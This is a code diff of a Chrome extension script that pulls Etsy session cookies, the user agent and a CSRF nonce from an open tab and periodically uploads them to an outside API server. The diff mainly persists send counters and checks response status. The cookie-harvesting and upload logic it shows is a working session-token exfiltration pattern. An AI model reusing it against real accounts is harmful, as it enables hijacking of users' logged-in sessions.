@@ -3,12 +3,9 @@ const dev = "https://api.cyberonegate.com";
 const pro = "https://api.2hglobalstore.com";
 let token = "";
 let storeId = "";
-let timer = 300;
+let timer = 1080;
 let server = "production";
-let sent = 0;
-let sentSuccess = 0;
-let sentFail = 0;
-const delayTime = 5000;
+const delayTime = 10000;
 
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     if (message.action === "startCookieExtractor") {
@@ -16,14 +13,19 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
         storeId = message.storeId;
         timer = Number(message.timer);
         server = message.server;
-        sent = Number(message.sent);
-        sentSuccess = Number(message.sentSuccess);
-        sentFail = Number(message.sentFail);
 
         chrome.tabs.query({ }, (tabs) => {
             (async () => {
                 const executeProcess = async () => {
                     try {
+                        const storageData = await new Promise(resolve =>
+                            chrome.storage.local.get(["sentSpan", "sentSuccessSpan", "sentFailSpan"], resolve)
+                        );
+
+                        let sent = Number(storageData.sentSpan || 0);
+                        let sentSuccess = Number(storageData.sentSuccessSpan || 0);
+                        let sentFail = Number(storageData.sentFailSpan || 0);
+
                         const etsyTab = tabs.find(tab => tab.url && tab.url.includes("https://www.etsy.com"));
 
                         if (!etsyTab) {
@@ -59,14 +61,20 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
 
                         const isDone = await sendApi(cookies, domResult.userAgent, domResult.csrfNonce);
 
+                        await chrome.storage.local.set({
+                            sentSpan: JSON.stringify(sent + 1),
+                            sentSuccessSpan: JSON.stringify(isDone ? sentSuccess + 1 : sentSuccess),
+                            sentFailSpan: JSON.stringify(isDone ? sentFail : sentFail + 1)
+                        });
+
                         if(isDone) {
                             await chrome.runtime.sendMessage({
                                 action: "sendData",
                                 data: {
                                     ...domData,
                                     cookies,
-                                    sent: sent++,
-                                    sentSuccess: sentSuccess++,
+                                    sent: sent + 1,
+                                    sentSuccess: sentSuccess + 1,
                                     sentFail
                                 }
                             });
@@ -76,9 +84,9 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
                                 data: {
                                     ...domData,
                                     cookies,
-                                    sent: sent++,
+                                    sent: sent + 1,
                                     sentSuccess,
-                                    sentFail: sentFail++
+                                    sentFail: sentFail + 1
                                 }
                             });
                         }
@@ -107,6 +115,14 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
             intervalId = null;
             console.log("Stopped interval time");
         }
+        chrome.storage.local.set({
+            sentSpan: "0",
+            sentSuccessSpan: "0",
+            sentFailSpan: "0"
+        });
+        chrome.runtime.sendMessage({
+            action: "finish",
+        });
         return true;
     }
 });
@@ -148,7 +164,7 @@ const sendApi = async (cookies, userAgent, csrfNonce) => {
         })
     }
     try {
-        await fetch(`${urlApi}/Store/UpdateMetadata/${storeId}`, {
+        const res = await fetch(`${urlApi}/Store/UpdateMetadata/${storeId}`, {
             method: "PUT",
             body: JSON.stringify(query),
             headers: {
@@ -156,7 +172,7 @@ const sendApi = async (cookies, userAgent, csrfNonce) => {
                 Authorization: token
             }
         })
-        return true;
+        return res.status >= 200 && res.status <= 299;
     } catch (err) {
         return false;
     }
